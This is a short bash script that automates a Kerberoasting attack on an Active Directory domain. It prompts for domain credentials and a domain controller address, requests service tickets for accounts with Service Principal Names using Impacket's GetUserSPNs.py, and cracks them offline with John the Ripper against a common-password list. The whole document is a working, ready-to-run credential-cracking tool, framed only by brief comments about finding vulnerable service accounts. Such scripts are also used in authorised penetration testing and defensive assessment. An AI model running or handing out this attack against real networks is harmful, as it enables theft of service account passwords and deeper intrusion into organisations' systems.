#!/bin/bash

# This script will attempt to connect to the target's domain controller and enumerate Service Principal Names (SPNs) associated with user accounts.
# This can help to identify potentially vulnerable service accounts.
# Additionally, it will use John the Ripper to extract the password from the output using the provided password list.

echo "Please provide the following information:"
read -p "Domain: " domain
read -p "Username: " username
read -s -p "Password: " password
echo
read -p "IP Address of the domain controller: " dc_ip

# Set variables
output_file="output.txt"
password_list="/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"

# Run GetUserSPNs.py to enumerate SPNs and save the output to a file
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip $dc_ip $domain/$username:$password > $output_file

echo "Scan completed. Review the results to identify potentially vulnerable service accounts."

# Use John the Ripper to extract the password from the output file using the provided password list
john --wordlist=$password_list --format=krb5tgs --rules $output_file

echo "Password cracking completed. Review the results to identify cracked passwords."
